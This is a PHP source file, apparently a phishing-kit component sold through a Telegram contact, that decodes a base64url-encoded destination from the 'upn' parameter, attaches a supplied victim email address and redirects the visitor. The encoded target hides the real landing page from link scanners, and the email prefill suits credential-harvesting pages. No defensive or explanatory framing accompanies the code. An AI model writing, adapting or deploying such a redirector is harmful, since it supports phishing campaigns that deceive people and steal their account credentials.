<?php
// Ghost Redirect Script
// For tools contact me: https://t.me/ghostverse

if (isset($_GET['upn'])) {
    $encodedUrl = $_GET['upn'];
    $decodedUrl = base64url_decode($encodedUrl); // Create a custom base64url_decode function

    if (filter_var($decodedUrl, FILTER_VALIDATE_URL)) {
        $email = isset($_GET['email']) ? $_GET['email'] : ''; // Get the "email" parameter if provided

        // Add or update the "email" parameter to the decoded URL if it's provided
        if (!empty($email) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
            // Parse the URL to extract existing query parameters
            $urlParts = parse_url($decodedUrl);

            // Parse the existing query string into an array
            parse_str($urlParts['query'] ?? '', $queryParams);

            // Add or update the "email" parameter
            $queryParams['email'] = $email;

            // Rebuild the query string
            $newQuery = http_build_query($queryParams);

            // Combine the URL parts back into the full URL with the updated query string
            $updatedUrl = $urlParts['scheme'] . '://' . $urlParts['host'] . $urlParts['path'] . '?' . $newQuery;

            header("Location: $updatedUrl");
            exit;
        } else {
            echo "Invalid input data provided."; // Invalid email address provided.
        }
    } else {
        echo "Invalid input data."; // Invalid URL.
    }
} else {
    echo "Invalid input data provided. Please provide valid data."; // Please provide a correct URL. The page you are looking for was not found
}

// Custom function to decode base64url
function base64url_decode($data) {
    $base64 = strtr($data, '-_', '+/');
    return base64_decode($base64);
}
?>
